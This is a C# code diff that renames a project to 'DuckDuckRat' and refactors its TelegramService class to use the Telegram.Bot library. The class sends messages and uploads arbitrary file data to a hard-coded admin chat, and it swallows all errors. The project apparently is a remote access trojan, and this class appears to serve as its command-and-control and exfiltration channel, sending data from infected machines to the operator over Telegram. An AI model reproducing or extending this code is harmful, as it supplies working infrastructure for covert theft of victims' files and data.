@@ -5,12 +5,15 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using Telegram.Bot;
-using VanguardCore;
+using DuckDuckRat;
 using System.Collections.Generic;
 using System.Linq;
 using Telegram.Bot.Types;
+using Telegram.Bot.Types.Enums;
+using Telegram.Bot.Types.ReplyMarkups;
+using Newtonsoft.Json;
 
-namespace FinalBot
+namespace DuckDuckRat
 {
     public static class TelegramService
     {
@@ -143,38 +146,20 @@ namespace FinalBot
 
         public static async Task SendMessage(string text, string? replyMarkup = null)
         {
-            for (int i = 0; i < 2; i++)
+            try
             {
-                try
-                {
-                    var baseUrl = GetBaseUrl();
-                    var url = $"{baseUrl}bot{_currentToken}/sendMessage";
-                    
-                    var payload = new StringBuilder();
-                    payload.Append("{");
-                    payload.Append($"\"chat_id\":\"{_adminId}\",");
-                    payload.Append($"\"text\":\"{JsonEscape(text)}\",");
-                    payload.Append("\"parse_mode\":\"Html\"");
-                    if (!string.IsNullOrEmpty(replyMarkup)) payload.Append($",\"reply_markup\":{replyMarkup}");
-                    payload.Append("}");
-
-                    using var content = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
-                    var response = await new HttpClient().PostAsync(url, content);
-                    if (response.IsSuccessStatusCode) return;
-                }
-                catch { await Task.Delay(1000); }
+                var markup = string.IsNullOrEmpty(replyMarkup) ? null : Newtonsoft.Json.JsonConvert.DeserializeObject<InlineKeyboardMarkup>(replyMarkup);
+                await _botClient.SendTextMessageAsync(_adminId, text, parseMode: Telegram.Bot.Types.Enums.ParseMode.Html, replyMarkup: markup);
             }
+            catch { }
         }
 
-        public static async Task SendAnimation(string animationUrl, string? caption = null)
+        public static async Task SendAnimation(string animationUrl, string? caption = null, string? replyMarkup = null)
         {
             try
             {
-                var baseUrl = GetBaseUrl();
-                var url = $"{baseUrl}bot{_currentToken}/sendAnimation";
-                var payload = $"{{\"chat_id\":\"{_adminId}\",\"animation\":\"{animationUrl}\",\"caption\":\"{JsonEscape(caption ?? "")}\",\"parse_mode\":\"Html\"}}";
-                using var content = new StringContent(payload, Encoding.UTF8, "application/json");
-                await new HttpClient().PostAsync(url, content);
+                var markup = string.IsNullOrEmpty(replyMarkup) ? null : Newtonsoft.Json.JsonConvert.DeserializeObject<InlineKeyboardMarkup>(replyMarkup);
+                await _botClient.SendAnimationAsync(_adminId, InputFile.FromFileId(animationUrl), caption: caption, parseMode: ParseMode.Html, replyMarkup: markup);
             }
             catch { }
         }
@@ -183,14 +168,8 @@ namespace FinalBot
         {
             try
             {
-                var baseUrl = GetBaseUrl();
-                var url = $"{baseUrl}bot{_currentToken}/sendDocument";
-                using var form = new MultipartFormDataContent();
-                form.Add(new StringContent(_adminId), "chat_id");
-                if (!string.IsNullOrEmpty(caption)) form.Add(new StringContent(caption), "caption");
-                form.Add(new StringContent("Html"), "parse_mode");
-                form.Add(new ByteArrayContent(data), "document", fileName);
-                await new HttpClient().PostAsync(url, form);
+                using var stream = new MemoryStream(data);
+                await _botClient.SendDocumentAsync(_adminId, InputFile.FromStream(stream, fileName), caption: caption, parseMode: ParseMode.Html);
             }
             catch { }
         }
@@ -202,3 +181,5 @@ namespace FinalBot
         }
     }
 }
+
+
